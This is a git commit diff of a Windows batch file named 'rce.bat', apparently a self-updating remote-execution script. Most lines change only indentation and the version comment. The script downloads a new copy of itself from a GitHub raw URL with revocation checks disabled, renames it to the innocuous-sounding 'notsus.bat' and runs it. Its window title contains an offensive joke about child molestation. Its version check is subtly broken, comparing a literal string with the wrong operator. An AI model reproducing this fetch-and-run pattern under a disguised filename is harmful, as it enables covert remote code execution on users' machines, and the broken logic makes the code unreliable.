1940fd5ab418629ba728ffca618fbcfc253678db
NajdzrBalls <127052802+NajdzrBalls@users.noreply.github.com>
2023-03-05 22:21:16 +0100

    Update rce.bat

--- F/rce.bat
+++ F/rce.bat
@@ -1,12 +1,12 @@
-REM RBS v0.3 - DEBUG
+rem RBS v0.2 - DEBUG
 @echo off
 
 set "title_tag"="Discord Nitro Enjoyer's and Child Moelester's Remote Batch Script - DEBUG"
 title %title_tag%
 
 if defined UPDATED (
-	del temp.bat
-	set update_state=done
+del temp.bat
+set update_state=done
 )
 
 set EXECFile=notsus.bat
@@ -15,9 +15,9 @@ if not exist c:\Users\Public\skipupdate.dat (goto :check)
 :connFailed
 
 if defined update_state (
-	echo Update completed successfully!
+echo Update completed successfully!
 ) else (
-	echo Update skipped or failed!
+echo Update skipped or failed!
 )
 pause
 exit
@@ -27,19 +27,18 @@ curl -s -o rce.bat --ssl-no-revoke "https://raw.githubusercontent.com/NajdzrBall
 set /p GHVer=<rce.bat
 set /p LOVer=<%EXECFile%
 if %GHVer%==%LOVer% (
-	echo Newest version!
-	set update_state=done
+echo Newest version!
+set update_state=done
 ) else (
-	if not "GHVer"="" (
-	echo Not newest!
-	echo del %EXECFile%>temp.bat
-	echo rename rce.bat %EXECFile%>>temp.bat
-	echo set UPDATED=True>>temp.bat
-	echo call %EXECFile%>>temp.bat
-	call temp.bat
-	) else (
-		echo Connection failed!
-		goto :connFailed
-	)
+if not "GHVer"="" (
+echo Not newest!
+echo del %EXECFile%>temp.bat
+echo rename rce.bat %EXECFile%>>temp.bat
+echo set UPDATED=True>>temp.bat
+echo call %EXECFile%>>temp.bat
+call temp.bat
+) else (
+echo Connection failed!
+goto :connFailed
 )
-
+)
